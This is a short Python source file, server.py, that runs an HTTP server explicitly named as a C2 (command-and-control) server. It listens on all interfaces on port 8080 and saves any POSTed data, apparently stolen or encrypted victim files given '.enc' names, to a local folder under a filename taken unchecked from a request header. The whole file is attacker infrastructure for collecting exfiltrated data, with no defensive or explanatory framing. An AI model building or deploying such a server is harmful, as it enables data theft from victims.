# server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        filename = self.headers.get('X-Filename', 'unknown.enc')
        data = self.rfile.read(content_length)

        os.makedirs('received', exist_ok=True)
        with open(f'received/{filename}', 'wb') as f:
            f.write(data)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"File received")

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), C2Handler)
    print("C2 server listening on port 8080...")
    server.serve_forever()
